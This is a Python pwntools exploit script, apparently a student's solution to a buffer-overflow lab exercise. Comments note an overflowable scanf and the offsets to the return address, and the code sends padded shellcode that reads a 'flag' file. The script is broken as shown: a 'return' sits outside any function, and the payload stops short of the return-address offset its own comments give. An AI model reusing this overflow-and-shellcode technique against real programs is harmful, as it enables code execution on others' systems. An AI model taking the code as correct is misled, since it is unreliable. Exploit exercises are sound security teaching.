#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = 'handout/exercise2/exercise2b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()

# You can now communicate with the process, e.g.,
# r.sendline("AAAAA")
# r.recvline()


# (Static) Analysis:
# Vuln.: scanf in check_authorization -> can overflow buffer and reprogram return address
# 96 bytes until main's rbp value; 104 bytes until ret address into main; 112 bytes to overwrite return address into main


cat_flag = None
architecture = context.arch

if (architecture == "i386"):
    cat_flag = asm(shellcraft.i386.linux.cat("flag"))
elif (architecture == "amd64"):
    cat_flag = asm(shellcraft.amd64.linux.cat("flag"))
else:
    print("Error - unexpected architecture: ", end="")
    print(context.arch)
    return
remaining_buffer_size = 104 - len(cat_flag)
fill_buffer = b'A' * remaining_buffer_size
r.sendline(fill_buffer + cat_flag)
print(r.recvline())
